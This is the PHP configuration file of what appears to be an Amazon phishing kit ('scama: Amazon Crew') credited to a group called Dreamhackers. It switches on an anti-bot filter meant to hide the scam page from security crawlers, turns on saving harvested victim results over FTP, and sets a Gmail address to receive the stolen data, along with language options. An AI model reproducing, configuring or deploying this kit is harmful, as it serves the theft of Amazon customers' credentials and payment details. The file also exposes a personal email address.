﻿<?php
error_reporting(0);
/*   
       #===========================================#
       #   scama: Amazon Crew                      #
       #   Team : Dreamhackers                     #
       #   mode : in Moroccan spamer               #
       #   creat : dexter & Patrick & Yassin       #
       #   web : www.facebook.com/dreamdeface.org  #     
       #===========================================#
 Please Don't Talk About Me When I'm Gone Alfred Publishing 
          Please don't forget to click save
              Option Send Email :
                 Send Email.
               Don't Send Email.
              Option Ftp Write
                 FTP Write.
             Don't FTP Save Result.
*/
//      <============= Langage Es ===============>
          $Langage_es = 0;
//      <============= Langage It ===============>
          $Langage_it = 0;		  
//      <============= Langage En ===============>
          $Langage_en = 0;
//      <============= Langage Fr ===============>
          $Langage_fr = 0;
//      <============= Langage De ===============>
          $Langage_de = 0;
//      <============= MultiLangage =============>
          $autolang = "1";
//      <=========== Activé Antibots ============>
          $antibots = 1;
//      <============== Save Rezult =============>
          $Ftp_Write = 1;
//      <============== Your Email ==============>
          $dexter_EMAIL = 'blurp.salah@gmail.com';
//      <============== Your Email ==============>
//         tchis Creat by dexter and Yassine 
//          mode In morroco with israel
//               welcom to brazess
?>
